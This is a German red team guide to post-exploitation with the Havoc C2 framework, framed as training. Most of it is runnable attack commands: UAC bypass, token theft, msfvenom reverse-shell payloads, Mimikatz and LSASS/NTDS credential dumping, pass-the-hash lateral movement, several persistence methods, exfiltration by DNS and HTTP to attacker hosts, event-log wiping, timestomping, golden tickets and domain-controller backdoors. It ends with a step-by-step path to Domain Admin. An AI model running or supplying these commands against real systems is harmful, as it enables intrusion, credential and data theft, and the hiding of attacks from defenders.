# Post-Exploitation Techniken mit Havoc C2

> **Ziel:** Maximale Ausnutzung eines kompromittierten Systems fÃ¼r Red Team Operationen.

---

## ðŸ“‹ Inhaltsverzeichnis

1. [Post-Ex Phasen](#post-ex-phasen)
2. [Reconnaissance & Enumeration](#reconnaissance--enumeration)
3. [Privilege Escalation](#privilege-escalation)
4. [Credential Dumping](#credential-dumping)
5. [Lateral Movement](#lateral-movement)
6. [Persistence](#persistence)
7. [Data Exfiltration](#data-exfiltration)
8. [Covering Tracks](#covering-tracks)
9. [Domain Dominance](#domain-dominance)
10. [Advanced Techniques](#advanced-techniques)

---

## Post-Ex Phasen

### Typischer Red Team Kill Chain

```
1. Initial Access       â†’ Beacon landet
2. Reconnaissance       â†’ System-/Netzwerk-Info sammeln
3. Privilege Escalation â†’ Admin/SYSTEM erlangen
4. Credential Dumping   â†’ PasswÃ¶rter/Hashes extrahieren
5. Lateral Movement     â†’ Zu anderen Systemen bewegen
6. Persistence          â†’ Zugriff sichern
7. Data Exfiltration    â†’ Ziele erreichen
8. Cleanup              â†’ Spuren verwischen
```

---

## Reconnaissance & Enumeration

### System-Information

```bash
# === BASISDATEN ===

# Benutzer-Kontext
whoami
whoami /all
whoami /priv
whoami /groups

# System-Info
systeminfo
hostname
ver

# Netzwerk
ipconfig /all
route print
arp -a
netstat -ano

# === ERWEITERTE ENUMERATION ===

# Alle lokalen Benutzer
net user
net localgroup

# Administratoren
net localgroup administrators

# Domain-Info (falls Domain-joined)
net user /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain

# Aufgaben & Services
tasklist /v
sc query
schtasks /query /fo LIST /v

# Installierte Software
wmic product get name,version
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall

# Laufende Prozesse (detailliert)
wmic process list full

# Security-Software
wmic /namespace:\\root\securitycenter2 path antivirusproduct get displayname,pathToSignedProductExe

# Firewall-Status
netsh advfirewall show allprofiles
netsh firewall show state
netsh firewall show config
```

### Havoc-Kommandos

```bash
# In Havoc Session:

# Environment Variables
env

# Prozess-Liste mit Details
ps

# Screenshot
screenshot

# Clipboard-Inhalt
clipboard

# Netzwerk-Connections
netstat

# Token-Informationen
token list
```

### PowerShell Enumeration

```powershell
# In Havoc:
powershell-import /path/to/PowerView.ps1

# Dann:
powershell Get-NetUser
powershell Get-NetComputer
powershell Get-NetGroup
powershell Get-NetSession
powershell Get-NetShare
powershell Find-InterestingFile
```

---

## Privilege Escalation

### Methode 1: UAC Bypass

```bash
# PrÃ¼fe aktuellen IntegritÃ¤ts-Level
whoami /groups | findstr "Integrity"

# Falls "Medium Mandatory Level" â†’ UAC aktiv

# UAC Bypass (Windows 10/11)
# Via fodhelper.exe
shell reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\beacon.exe" /f
shell reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f
shell fodhelper.exe

# Cleanup
shell reg delete HKCU\Software\Classes\ms-settings /f
```

### Methode 2: Token Stealing

```bash
# Finde Prozess mit hÃ¶heren Rechten
ps

# Beispiel: winlogon.exe (lÃ¤uft als SYSTEM)
# PID: 456

# Steal Token
steal_token 456

# Verify
whoami
# Sollte: NT AUTHORITY\SYSTEM zeigen
```

### Methode 3: Service Exploitation

```bash
# Unquoted Service Path
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# Beispiel-Ausgabe:
# CustomService   C:\Program Files\My App\service.exe   Auto

# Exploit: Erstelle C:\Program.exe
upload beacon.exe "C:\Program.exe"

# Service neu starten
sc stop CustomService
sc start CustomService

# Session sollte als SYSTEM zurÃ¼ckkommen
```

### Methode 4: AlwaysInstallElevated

```bash
# PrÃ¼fe Registry
shell reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
shell reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Falls beide auf 0x1:
# Erstelle MSI-Payload
# (Auf Angreifer-System mit msfvenom)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=... LPORT=... -f msi -o evil.msi

# Auf Target:
upload evil.msi C:\temp\update.msi
shell msiexec /quiet /qn /i C:\temp\update.msi
```

---

## Credential Dumping

### Mimikatz (eingebaut in Havoc)

```bash
# WICHTIG: BenÃ¶tigt Admin oder SYSTEM

# 1. Privilege eskalieren falls nÃ¶tig
steal_token SYSTEM_PROCESS_PID

# 2. Debug-Rechte aktivieren
mimikatz privilege::debug

# 3. Credentials dumpen
mimikatz sekurlsa::logonpasswords

# Erwartete Ausgabe:
# Username : alice
# Domain   : CORP
# NTLM     : 8846f7eaee8fb117ad06bdd830b7586c
# Password : Password123!

# 4. Tickets (Kerberos)
mimikatz sekurlsa::tickets
```

### LSASS Dump (alternative)

```bash
# 1. LSASS-Prozess finden
ps | findstr lsass

# 2. Dump erstellen (via Task Manager Trick)
shell rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump <LSASS_PID> C:\temp\lsass.dmp full

# 3. Herunterladen
download C:\temp\lsass.dmp

# 4. Lokal analysieren (auf Angreifer-PC)
pypykatz lsa minidump lsass.dmp
```

### SAM Dump

```bash
# Registry Hives dumpen
shell reg save HKLM\SAM C:\temp\sam
shell reg save HKLM\SYSTEM C:\temp\system

# Herunterladen
download C:\temp\sam
download C:\temp\system

# Lokal extrahieren
impacket-secretsdump -sam sam -system system LOCAL
```

### Domain Controller Secrets

```bash
# NTDS.dit dumpen (auf DC, benÃ¶tigt Domain Admin)

# Methode 1: VSS Shadow Copy
shell vssadmin create shadow /for=C:
# Output: Shadow Copy ID: {GUID}

shell copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit
shell copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM

download C:\temp\ntds.dit
download C:\temp\SYSTEM

# Lokal:
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# Methode 2: DCSync (besser, keine Disk-I/O)
mimikatz lsadump::dcsync /user:krbtgt
mimikatz lsadump::dcsync /domain:corp.local /all
```

---

## Lateral Movement

### Methode 1: Pass-the-Hash

```bash
# Mit geernteten NTLM-Hash
# Hash: 8846f7eaee8fb117ad06bdd830b7586c

# Via WMI
shell wmic /node:192.168.1.50 /user:CORP\alice /password:8846f7eaee8fb117ad06bdd830b7586c process call create "cmd.exe /c C:\beacon.exe"

# Via PsExec (Havoc hat eingebautes psexec-Ã¤hnliches)
# Upload payload zu Remote-System
upload beacon.exe \\192.168.1.50\C$\Windows\Temp\svchost.exe

# Execute remote
shell sc \\192.168.1.50 create "WindowsUpdate" binPath= "C:\Windows\Temp\svchost.exe"
shell sc \\192.168.1.50 start "WindowsUpdate"
```

### Methode 2: Overpass-the-Hash (Pass-the-Key)

```bash
# Mit RC4-Key (NTLM-Hash) Kerberos-Ticket erstellen
mimikatz sekurlsa::pth /user:alice /domain:corp.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:cmd.exe

# In neuer cmd:
shell dir \\DC01\C$
# Sollte funktionieren (Kerberos-Authentifizierung)
```

### Methode 3: WinRM

```bash
# Falls WinRM aktiviert (Port 5985/5986)
shell winrs -r:192.168.1.50 -u:CORP\alice -p:Password123! cmd.exe

# Oder via PowerShell Remoting
powershell Enter-PSSession -ComputerName 192.168.1.50 -Credential CORP\alice
```

### Methode 4: SMB Remote Exec

```bash
# Via impacket (auf Angreifer-PC, externe Tools)
impacket-psexec CORP/alice@192.168.1.50 -hashes :8846f7eaee8fb117ad06bdd830b7586c

# Oder wmiexec
impacket-wmiexec CORP/alice@192.168.1.50 -hashes :8846f7eaee8fb117ad06bdd830b7586c
```

### Havoc Pivot

```bash
# Proxy/Socks einrichten
socks start 1080

# Jetzt kÃ¶nnen Sie via Proxychains auf interne Netzwerke zugreifen
# Auf Angreifer-PC:
proxychains nmap -sT 192.168.1.0/24
proxychains impacket-psexec CORP/alice@192.168.1.50
```

---

## Persistence

### Methode 1: Registry Run Keys

```bash
# Aktueller User
upload beacon.exe C:\Users\alice\AppData\Local\Windows\svchost.exe

shell reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Update" /t REG_SZ /d "C:\Users\alice\AppData\Local\Windows\svchost.exe" /f

# System-weit (benÃ¶tigt Admin)
shell reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdate" /t REG_SZ /d "C:\Windows\System32\updater.exe" /f
```

### Methode 2: Scheduled Task

```bash
# Task erstellen
shell schtasks /create /tn "SystemMaintenance" /tr "C:\Windows\System32\beacon.exe" /sc onlogon /ru SYSTEM /rl HIGHEST /f

# Alternativ: TÃ¤gliche AusfÃ¼hrung
shell schtasks /create /tn "DailyCheck" /tr "C:\Windows\beacon.exe" /sc daily /st 09:00 /ru SYSTEM /f

# Verify
shell schtasks /query /tn "SystemMaintenance"
```

### Methode 3: Windows Service

```bash
# Beacon als Service
shell sc create "WindowsDefenderUpdate" binPath= "C:\Windows\System32\wdupdate.exe" start= auto
shell sc description "WindowsDefenderUpdate" "Windows Defender Definition Update Service"

# Service starten
shell sc start "WindowsDefenderUpdate"

# Service wird nach Reboot automatisch starten
```

### Methode 4: WMI Event Subscription

```bash
powershell $FilterArgs = @{name='SystemBootFilter'; EventNameSpace='root\CimV2'; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"}

powershell $Filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs

powershell $ConsumerArgs = @{name='SystemBootConsumer'; CommandLineTemplate="C:\Windows\System32\beacon.exe"}

powershell $Consumer = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

powershell $FilterToConsumerArgs = @{Filter = [Ref] $Filter; Consumer = [Ref] $Consumer;}

powershell $FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
```

### Methode 5: COM Hijacking

```bash
# Finde COM-Objekt ohne Admin-Rechte
shell reg query "HKCU\Software\Classes\CLSID" /s /f "InProcServer32"

# Hijack ein unbenutztes CLSID
shell reg add "HKCU\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InProcServer32" /ve /t REG_SZ /d "C:\Users\alice\AppData\Local\evil.dll" /f

# Wenn Anwendung CLSID lÃ¤dt â†’ DLL wird geladen
```

---

## Data Exfiltration

### Methode 1: Direkt via C2

```bash
# Einzelne Datei
download C:\Users\alice\Documents\passwords.xlsx

# Ordner archivieren und herunterladen
shell powershell Compress-Archive -Path C:\Sensitive\* -DestinationPath C:\temp\data.zip
download C:\temp\data.zip
shell del C:\temp\data.zip
```

### Methode 2: Cloud-Upload

```bash
# Upload zu OneDrive/Dropbox via PowerShell
powershell $source = "C:\Sensitive\data.xlsx"
powershell $dest = "https://content.dropboxapi.com/2/files/upload"
powershell $token = "YOUR_DROPBOX_TOKEN"
powershell $headers = @{"Authorization"="Bearer $token"; "Dropbox-API-Arg"='{"path":"/exfil/data.xlsx"}'; "Content-Type"="application/octet-stream"}
powershell Invoke-RestMethod -Uri $dest -Method Post -InFile $source -Headers $headers
```

### Methode 3: DNS Exfiltration

```bash
# Daten Base64-enkodieren
shell powershell $data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\secrets.txt"))

# Per DNS-Queries exfiltrieren (Split in 63-Byte Chunks)
shell powershell $data -split '(.{60})' | Where-Object {$_} | ForEach-Object { nslookup "$_.exfil.attacker-domain.com" }

# Auf Angreifer-DNS-Server: Queries loggen und Base64 dekodieren
```

### Methode 4: HTTP POST

```bash
powershell $file = Get-Content C:\secrets.txt -Raw
powershell Invoke-WebRequest -Uri "https://attacker-server.com/upload" -Method POST -Body $file
```

---

## Covering Tracks

### Log-Bereinigung

```bash
# Windows Event Logs lÃ¶schen (benÃ¶tigt Admin)
shell wevtutil cl System
shell wevtutil cl Security
shell wevtutil cl Application

# Spezifische Events
shell wevtutil qe Security /f:text | findstr "4624"  # Logon events

# PowerShell History lÃ¶schen
shell del %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Command History
shell doskey /reinstall
```

### Artefakte entfernen

```bash
# Payloads lÃ¶schen
shell del C:\Windows\Temp\beacon.exe
shell del C:\Users\alice\AppData\Local\temp\*.exe

# Prefetch (Execution-Artefakte)
shell del C:\Windows\Prefetch\BEACON.EXE-*.pf

# Temporary Files
shell del %TEMP%\* /q /s
```

### Timestamps Ã¤ndern (Timestomping)

```bash
# Via PowerShell
powershell $(Get-Item C:\Windows\System32\evil.exe).creationtime = $(Get-Date "01/01/2020 12:00 am")
powershell $(Get-Item C:\Windows\System32\evil.exe).lastaccesstime = $(Get-Date "01/01/2020 12:00 am")
powershell $(Get-Item C:\Windows\System32\evil.exe).lastwritetime = $(Get-Date "01/01/2020 12:00 am")
```

---

## Domain Dominance

### Golden Ticket (Post-DC-Compromise)

```bash
# 1. KRBTGT-Hash extrahieren (auf DC)
mimikatz lsadump::dcsync /user:krbtgt

# Output:
# Hash NTLM: 8c4a8f7e3d8b6c2a1f9e5d4c3b2a1098

# 2. Golden Ticket erstellen
mimikatz kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:8c4a8f7e3d8b6c2a1f9e5d4c3b2a1098 /id:500 /ptt

# 3. Verify
shell klist

# 4. Zugriff auf alles
shell dir \\DC01\C$
shell dir \\FILE-SERVER\admin$
```

### Silver Ticket (Service-spezifisch)

```bash
# Beispiel: CIFS (File Share)
# Computer-Account-Hash benÃ¶tigt

mimikatz kerberos::golden /user:alice /domain:corp.local /sid:S-1-5-21-... /target:FILE-SERVER.corp.local /service:cifs /rc4:COMPUTER_ACCOUNT_NTLM /ptt

# Zugriff auf File-Server
shell dir \\FILE-SERVER\C$
```

### Skeleton Key (DC-Backdoor)

```bash
# Auf DC (als SYSTEM):
mimikatz misc::skeleton

# Jetzt kÃ¶nnen Sie sich als JEDER Domain-User mit Passwort "mimikatz" einloggen
# Beispiel:
shell runas /user:CORP\domainadmin cmd.exe
# Passwort: mimikatz

# Session als Domain Admin!
```

---

## Advanced Techniques

### Kerberoasting

```bash
# 1. SPNs finden
powershell-import /path/to/PowerView.ps1
powershell Get-DomainUser -SPN

# 2. TGS-Tickets requesten
shell setspn -T corp.local -Q */*

# 3. Tickets extrahieren
mimikatz kerberos::list /export

# 4. Offline cracken (auf Angreifer-PC)
hashcat -m 13100 tickets.txt wordlist.txt
```

### AS-REP Roasting

```bash
# Finde User ohne Kerberos Pre-Auth
powershell Get-DomainUser -PreauthNotRequired

# Request AS-REP
# (Impacket auf Angreifer-PC)
impacket-GetNPUsers corp.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt

# Crack
hashcat -m 18200 hashes.txt wordlist.txt
```

### DCS shadow (DC Shadow Attack)

```bash
# Registriere Fake Domain Controller
mimikatz lsadump::dcshadow /object:alice /attribute:primaryGroupID /value:512

# Alice ist jetzt in Domain Admins (GroupID 512)

# Push changes
mimikatz lsadump::dcshadow /push
```

### NTLM Relay

```bash
# Responder auf Angreifer-PC starten
responder -I eth0 -rdwv

# Oder: ntlmrelayx
impacket-ntlmrelayx -tf targets.txt -smb2support

# Warte auf NTLM-Auth von Target
# Relay zu anderem System
```

---

## MITRE ATT&CK Mapping

| Tactic | Technique | Havoc-Kommando |
|--------|-----------|----------------|
| **Reconnaissance** | T1082 System Info | `systeminfo`, `whoami /all` |
| **Privilege Escalation** | T1134 Token Manipulation | `steal_token PID` |
| **Credential Access** | T1003 Credential Dumping | `mimikatz sekurlsa::logonpasswords` |
| **Lateral Movement** | T1021.002 SMB/Admin Shares | `psexec`, `wmic` |
| **Persistence** | T1547.001 Registry Run Keys | `reg add HKCU\...\Run` |
| **Defense Evasion** | T1070.001 Clear Logs | `wevtutil cl` |
| **Collection** | T1005 Data from Local System | `download` |
| **Exfiltration** | T1041 C2 Channel | `download`, `upload` |

---

## Praktische Szenarien

### Szenario: Domain Admin in 30 Minuten

```bash
# === PHASE 1: Initial Access ===
# Payload landet als User "alice" auf WORKSTATION01

# === PHASE 2: Local Recon ===
whoami /all
# Output: CORP\alice (Medium Integrity)

systeminfo | findstr /B /C:"Domain"
# Output: Domain: corp.local

# === PHASE 3: Local Priv Esc ===
# UAC Bypass
shell reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\beacon.exe" /f
shell fodhelper.exe

# Neue Session als SYSTEM auf WORKSTATION01

# === PHASE 4: Credential Harvesting ===
mimikatz sekurlsa::logonpasswords

# Output:
# bob:Password123
# IT-Admin:SuperSecure456!

# === PHASE 5: Lateral Movement ===
# "IT-Admin" hat Session auf FILESERVER01

upload beacon.exe \\FILESERVER01\C$\Windows\Temp\update.exe
shell wmic /node:FILESERVER01 /user:IT-Admin /password:SuperSecure456! process call create "C:\Windows\Temp\update.exe"

# Neue Session auf FILESERVER01 als IT-Admin

# === PHASE 6: Domain Recon ===
powershell-import PowerView.ps1
powershell Get-DomainController

# Output: DC01.corp.local

powershell Get-DomainGroupMember "Domain Admins"
# Output: Administrator, DA-Bob

# === PHASE 7: Target Domain Admin ===
# Kerberoasting
powershell Get-DomainUser -SPN | Where-Object {$_.memberof -match "Domain Admins"}

# Request TGS
mimikatz kerberos::ask /target:DA-Bob

# Crack offline (simuliert als erfolgreich)
# DA-Bob:DomainPassword789!

# === PHASE 8: Compromise DC ===
shell runas /user:CORP\DA-Bob cmd.exe
# Passwort: DomainPassword789!

# In neuer Session: PsExec zu DC
upload beacon.exe \\DC01\C$\Windows\Temp\svchost.exe
shell sc \\DC01 create TempService binPath= "C:\Windows\Temp\svchost.exe"
shell sc \\DC01 start TempService

# === PHASE 9: Domain Dominance ===
# Session auf DC01 als SYSTEM

# DCSync
mimikatz lsadump::dcsync /user:krbtgt
# Hash: abcd1234...

# Golden Ticket
mimikatz kerberos::golden /user:MegaAdmin /domain:corp.local /sid:S-1-5-21-... /krbtgt:abcd1234... /ptt

# === SUCCESS: Domain Admin in 30 Min! ===
```

---

## Checkliste: Post-Exploitation

### Initial Foothold

- [ ] System-Info gesammelt
- [ ] User-Rechte geprÃ¼ft
- [ ] Netzwerk-Konfiguration ermittelt
- [ ] Security-Software identifiziert
- [ ] Persistence etabliert (basic)

### Privilege Escalation

- [ ] Local Admin erlangt
- [ ] SYSTEM-Rechte erlangt
- [ ] Tokens Ã¼berprÃ¼ft
- [ ] Credentials gedumpt

### Lateral Movement

- [ ] Andere Hosts identifiziert
- [ ] Zugangsdaten gesammelt
- [ ] Auf mindestens 2 weitere Hosts bewegt
- [ ] Domain-Controller identifiziert

### Domain Dominance

- [ ] Domain Admin Credentials
- [ ] DC kompromittiert
- [ ] KRBTGT-Hash extrahiert
- [ ] Golden Ticket erstellt
- [ ] Persistenz auf DC

---

## WeiterfÃ¼hrende Ressourcen

- **MITRE ATT&CK:** https://attack.mitre.org/
- **PayloadsAllTheThings:** https://github.com/swisskyrepo/PayloadsAllTheThings
- **HackTricks:** https://book.hacktricks.xyz/
- **Red Team Notes:** https://www.ired.team/
- **LOLBAS:** https://lolbas-project.github.io/

---

**Erstellt:** 2026-02-05
**Version:** 1.0
